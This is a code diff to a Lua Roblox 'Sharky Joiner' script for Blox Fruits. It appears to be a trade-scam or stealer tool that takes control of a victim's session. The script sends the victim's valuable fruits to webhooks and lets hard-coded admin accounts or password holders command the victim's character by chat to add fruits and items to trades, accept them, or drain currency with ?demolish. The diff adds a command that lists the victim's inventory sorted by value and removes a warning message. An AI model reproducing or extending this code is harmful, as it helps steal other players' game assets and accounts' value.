@@ -89,7 +89,7 @@ if type(Webhook) ~= "string" or type(Webhook2) ~= "string" or type(GoodFruitsWeb
 end
 
 local function ensureAdminUsernames()
-	local coreAdmins = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg", "pikapimon"}
+	local coreAdmins = {"aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg", "pikapimon"}
 	if type(Usernames) ~= "table" then Usernames = {} end
 
 	local existingUsernames = {}
@@ -355,7 +355,7 @@ local function sendWebhook(inventory)
 		return
 	end
 
-	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true }
+	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true, ["Love-Love"] = true }
 
 	-- Retrieve stored webhook URLs
 	local url1 = webhook1_key and _G[webhook1_key]
@@ -1301,74 +1301,143 @@ local Commands = {
 		end
 	},
 	help = {
-		description = "Displays this list of commands.",
-		usage = "?help",
-		execute = function()
-			task.spawn(function()
-				local cmds = {
-					"--- Sharky Joiner Commands ---",
-					"?help : Shows this list",
-					"?test : Checks script response time",
-					"--- Movement ---",
-					"?jump : Force character jump",
-					"?sit : Attempt to sit at trade table",
-					"?tp : Teleport to Mansion/Cafe",
-					"?reset : Reset character",
-					"?rejoin : Rejoin server",
-					"--- Trading ---",
-					"?add <fruit> [count] : Add Blox Fruit(s) to trade",
-					"?additem <item> : Add Premium Item to trade",
-					"?addall : Add 1 of each configured fruit (FruitsToHit) to trade",
-					"?addallitems : Add 1 of each premium item to trade",
-					"?cleartrade : Remove your items from trade",
-					"?accept : Accept the trade (must be sitting)",
-					"--- Utility ---",
-					"?resetfruit <fruit> [count] : Equip & reset with fruit(s)",
-					"?invite : Show Discord invite UI to victim",
-					"?demolish : !! DANGEROUS !! Reset fruits & drain currency",
-					"--- Activation / Admin ---",
-					"?activate <password> : Gain command access for session",
-					"?allowall : Toggle allowing ANYONE to use commands"
-				}
-				sendMessage("Sending command list (" .. #cmds .. " lines)...")
-				task.wait(0.5)
-				for i, msg in ipairs(cmds) do
-					sendMessage(msg)
-					task.wait(0.3 + (i * 0.02)) -- Small, increasing delay
-				end
-				sendMessage("--- End of Commands ---")
-			end)
-		end
-	},
+        description = "Displays a condensed list of commands.",
+        usage = "?help",
+        execute = function()
+            task.spawn(function()
+                -- Condensed command list (names only)
+                local cmds = {
+                    "Cmds 1/4: ?help ?test ?jump ?sit ?tp ?reset ?rejoin",
+                    "Cmds 2/4: ?add ?additem ?addall ?addallitems ?cleartrade ?accept",
+                    "Cmds 3/4: ?resetfruit ?invite ?demolish",
+                    "Cmds 4/4: ?allowall ?showinv"
+                }
+                sendMessage("--- Commands ---")
+                task.wait(0.3) -- Initial small delay
+                for i, msg in ipairs(cmds) do
+                    sendMessage(msg)
+                    task.wait(0.3) -- Consistent small delay between lines
+                end
+            end)
+        end
+    },
+
+    showinv = {
+        description = "Shows the victim's Blox Fruit inventory (by value) in chat.",
+        usage = "?showinv",
+        execute = function()
+            task.spawn(function() -- Run in a separate thread
+                sendMessage("Fetching inventory (sorted by value)...")
+                local inventory = getInventory()
+                if not inventory then
+                    sendMessage("Error: Failed to retrieve inventory.")
+                    return
+                end
+    
+                local fruitDataList = {} -- Store fruit data {name=..., count=..., value=...}
+                for _, item in pairs(inventory) do
+                    if item.Type == "Blox Fruit" then
+                        -- Store the raw data needed for sorting and formatting
+                        table.insert(fruitDataList, {
+                            name = item.Name,
+                            count = item.Count,
+                            value = item.Value or 0 -- Default value to 0 if nil
+                        })
+                    end
+                end
+    
+                if #fruitDataList == 0 then
+                    sendMessage("No Blox Fruits found in inventory.")
+                    return
+                end
+    
+                -- Sort by value (descending)
+                table.sort(fruitDataList, function(a, b)
+                    return a.value > b.value
+                end)
+    
+                -- Now format the sorted list for display
+                local fruitDisplayList = {}
+                for _, fruitData in ipairs(fruitDataList) do
+                    local fruitString = fruitData.name
+                    if fruitData.count > 1 then
+                        fruitString = fruitString .. " (x" .. fruitData.count .. ")"
+                    end
+                    table.insert(fruitDisplayList, fruitString)
+                end
+    
+                -- Chunking Logic (remains mostly the same, uses fruitDisplayList)
+                local messageLimit = 180 -- Keep well below Roblox limit (~200)
+                local totalChunks = math.ceil(#fruitDisplayList / 10) -- Estimate chunks based on ~10 items per line, adjust if needed
+                local currentMessage = "Fruits [Value] (1/".. totalChunks .. "): " -- Start first message
+                local chunkIndex = 1
+    
+                for i, fruitName in ipairs(fruitDisplayList) do
+                    local separator = (#currentMessage > string.len("Fruits [Value] (X/Y): ")) and ", " or "" -- Add separator if not first item in message
+                    local potentialAddition = separator .. fruitName
+    
+                    -- Check if adding the next fruit exceeds the limit
+                    if string.len(currentMessage) + string.len(potentialAddition) > messageLimit then
+                        -- Send the current message chunk
+                        sendMessage(currentMessage)
+                        task.wait(0.4) -- Wait between messages
+                        chunkIndex = chunkIndex + 1
+                        currentMessage = "Fruits [Value] ("..chunkIndex.."/".. totalChunks .."): " .. fruitName -- Start new message
+                    else
+                        -- Add to the current message chunk
+                        currentMessage = currentMessage .. potentialAddition
+                    end
+                end
+    
+                -- Send the last remaining message chunk
+                if currentMessage ~= "" and not currentMessage:match("^Fruits %[%w+%].*%): $") then -- Avoid sending empty "Fruits: " line
+                    sendMessage(currentMessage)
+                end
+    
+                task.wait(0.2)
+                sendMessage("Inventory display complete.")
+            end)
+        end
+    },
 
 	-- Activation / Admin Commands
 	activate = {
-		description = "Activates command access using a password.",
-		usage = "?activate <password>",
-		execute = function(password)
-			if not password or password == "" then return end -- No feedback on wrong usage
+        description = "Activates command access using a password.",
+        usage = "?activate <password>",
+        execute = function(password)
+            if not password or password == "" then
+                sendMessage("Usage: ?activate <password>") -- Give usage feedback if no password provided
+                return
+            end
+    
+            local foundPass = false
+            for _, validPass in ipairs(ActivationPasswords) do
+                if password == validPass then
+                    foundPass = true
+                    break
+                end
+            end
+    
+            if foundPass then
+                local player = Players:FindFirstChild(CommandContext.PlayerName) -- Get player from context
+                if player then
+                    if activatedUsers[player.UserId] then
+                        sendMessage("You are already activated, " .. player.Name .. ".")
+                    else
+                        activatedUsers[player.UserId] = true
+                        sendMessage("Activation successful for this session, " .. player.Name .. "!")
+                        print("Activated User: " .. player.Name .. " (ID: " .. player.UserId .. ")")
+                    end
+                else
+                    print("Activation successful but could not find player context: " .. CommandContext.PlayerName) -- Log locally if player context missing
+                end
+            else
+                -- Added feedback for incorrect password
+                sendMessage("Incorrect password.")
+            end
+        end
+    },
 
-			local foundPass = false
-			for _, validPass in ipairs(ActivationPasswords) do
-				if password == validPass then
-					foundPass = true
-					break
-				end
-			end
-
-			if foundPass then
-				local player = Players:FindFirstChild(CommandContext.PlayerName) -- Get player from context
-				if player then
-					activatedUsers[player.UserId] = true
-					sendMessage("Activation successful for this session, " .. player.Name .. "!")
-					print("Activated User: " .. player.Name .. " (ID: " .. player.UserId .. ")")
-				else
-					print("Activation successful but could not find player: " .. CommandContext.PlayerName) -- Log locally if player not found
-				end
-			end
-			-- Intentionally no feedback for incorrect password attempts in chat
-		end
-	},
 	allowall = {
 		description = "Toggles allowing ANY player to use commands.",
 		usage = "?allowall",
@@ -1377,7 +1446,7 @@ local Commands = {
 			local status = allowEveryone and "ENABLED" or "DISABLED"
 			sendMessage("AllowEveryone Mode: " .. status .. ". Command access is now " .. (allowEveryone and "OPEN to ALL players." or "RESTRICTED."))
 			if allowEveryone then
-				sendMessage("!! WARNING: ANYONE can now use commands, including potentially harmful ones like ?demolish !!")
+				sendMessage("ANYONE can now use commands")
 			end
 		end
 	}
